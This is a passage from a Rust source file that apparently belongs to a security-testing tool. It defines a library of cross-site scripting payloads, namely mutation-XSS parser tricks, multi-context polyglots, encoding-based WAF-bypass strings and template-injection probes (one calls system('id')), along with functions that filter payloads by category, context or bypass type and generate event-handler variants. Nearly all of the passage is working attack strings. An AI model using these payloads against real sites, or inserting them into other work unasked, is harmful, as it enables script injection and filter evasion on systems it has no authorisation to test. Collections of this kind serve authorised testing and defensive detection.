    XssPayload { payload: "<math><mi><table><mglyph><img src=x onerror=alert(1)>", category: XssCategory::MutationXss, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "MathML mi table foster parenting" },
    XssPayload { payload: "<option><style></option></select><img src=x onerror=alert(1)>", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Option style parser confusion" },
    XssPayload { payload: "<select><template><img src=x onerror=alert(1)></template></select>", category: XssCategory::MutationXss, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Select template mutation" },
    XssPayload { payload: "<dl><dt><table><thead><svg onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "Definition list table SVG mutation" },
    XssPayload { payload: "<ruby><rb><table><rt><svg onload=alert(1)>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "Ruby element table mutation" },
    XssPayload { payload: "<p><svg><style><title><img src onerror=alert(1)></title></style></svg>", category: XssCategory::MutationXss, context: XssContext::Svg, waf_bypass: XssWafBypass::None, description: "SVG style title escape" },
];

// ---------------------------------------------------------------------------
// Polyglot payloads (10+)
// ---------------------------------------------------------------------------
const POLYGLOT_PAYLOADS: &[XssPayload] = &[
    XssPayload { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", category: XssCategory::Polyglot, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::EncodingBypass, description: "Ultimate polyglot payload" },
    XssPayload { payload: "'\"><img src=x onerror=alert(1)><svg/onload=alert(1)>{{7*7}}${7*7}<%= 7*7 %>", category: XssCategory::Polyglot, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Multi-context probe (HTML+template)" },
    XssPayload { payload: "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", category: XssCategory::Polyglot, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::EncodingBypass, description: "Multi-quote-style breakout" },
    XssPayload { payload: "\"><script>alert(1)</script>\"><img/src=x onerror=alert(1)><svg/onload=alert(1)>", category: XssCategory::Polyglot, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Script+img+svg triple payload" },
    XssPayload { payload: "<math><mtext></mtext><mglyph><svg><style><img src=x onerror=alert(1)>", category: XssCategory::Polyglot, context: XssContext::MathMl, waf_bypass: XssWafBypass::None, description: "MathML+SVG namespace polyglot" },
    XssPayload { payload: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", category: XssCategory::Polyglot, context: XssContext::Url, waf_bypass: XssWafBypass::EncodingBypass, description: "Context-closing polyglot" },
    XssPayload { payload: "\"onmouseover=alert(1)//\"onclick=alert(1)//\"onfocus=alert(1) autofocus//\"><script>alert(1)</script>", category: XssCategory::Polyglot, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Multi-event-handler polyglot" },
    XssPayload { payload: "'-alert(1)-'\"*alert(1)*\"`-alert(1)-`", category: XssCategory::Polyglot, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::None, description: "Multi-quote JS breakout polyglot" },
    XssPayload { payload: "<svg onload=alert(1)><img src=x onerror=alert(1)><body onload=alert(1)><input onfocus=alert(1) autofocus>", category: XssCategory::Polyglot, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Multi-tag auto-trigger polyglot" },
    XssPayload { payload: "{{constructor.constructor('alert(1)')()}}${alert(1)}<%=alert(1)%><%= system('id') %>", category: XssCategory::Polyglot, context: XssContext::JavaScriptString, waf_bypass: XssWafBypass::None, description: "Template engine polyglot" },
    XssPayload { payload: "\"><svg/onload=alert(1)>'><!--", category: XssCategory::Polyglot, context: XssContext::Attribute, waf_bypass: XssWafBypass::None, description: "Attribute breakout with comment" },
    XssPayload { payload: "-->'\"--><script>alert(1)</script>", category: XssCategory::Polyglot, context: XssContext::HtmlBody, waf_bypass: XssWafBypass::None, description: "Comment+attribute escape polyglot" },
];

/// Returns all XSS payloads.
pub fn all_xss_payloads() -> Vec<&'static XssPayload> {
    let mut all = Vec::with_capacity(
        REFLECTED_PAYLOADS.len()
            + STORED_PAYLOADS.len()
            + DOM_BASED_PAYLOADS.len()
            + MUTATION_XSS_PAYLOADS.len()
            + POLYGLOT_PAYLOADS.len(),
    );
    all.extend(REFLECTED_PAYLOADS.iter());
    all.extend(STORED_PAYLOADS.iter());
    all.extend(DOM_BASED_PAYLOADS.iter());
    all.extend(MUTATION_XSS_PAYLOADS.iter());
    all.extend(POLYGLOT_PAYLOADS.iter());
    all
}

/// Filter payloads by category.
pub fn xss_payloads_by_category(category: XssCategory) -> Vec<&'static XssPayload> {
    all_xss_payloads()
        .into_iter()
        .filter(|p| p.category == category)
        .collect()
}

/// Filter payloads by injection context.
pub fn xss_payloads_by_context(context: XssContext) -> Vec<&'static XssPayload> {
    all_xss_payloads()
        .into_iter()
        .filter(|p| p.context == context)
        .collect()
}

/// Filter payloads that use a WAF bypass technique.
pub fn xss_waf_bypass_payloads() -> Vec<&'static XssPayload> {
    all_xss_payloads()
        .into_iter()
        .filter(|p| p.waf_bypass != XssWafBypass::None)
        .collect()
}

/// Generate event handler XSS payloads for a given tag.
pub fn generate_event_handler_payloads(tag: &str) -> Vec<String> {
    EVENT_HANDLERS
        .iter()
        .map(|handler| format!("<{tag} {handler}=alert(1)>"))
        .collect()
}

/// Total count of all payloads in the XSS library.
pub fn xss_payload_count() -> usize {
    REFLECTED_PAYLOADS.len()
        + STORED_PAYLOADS.len()
        + DOM_BASED_PAYLOADS.len()
        + MUTATION_XSS_PAYLOADS.len()
        + POLYGLOT_PAYLOADS.len()
}
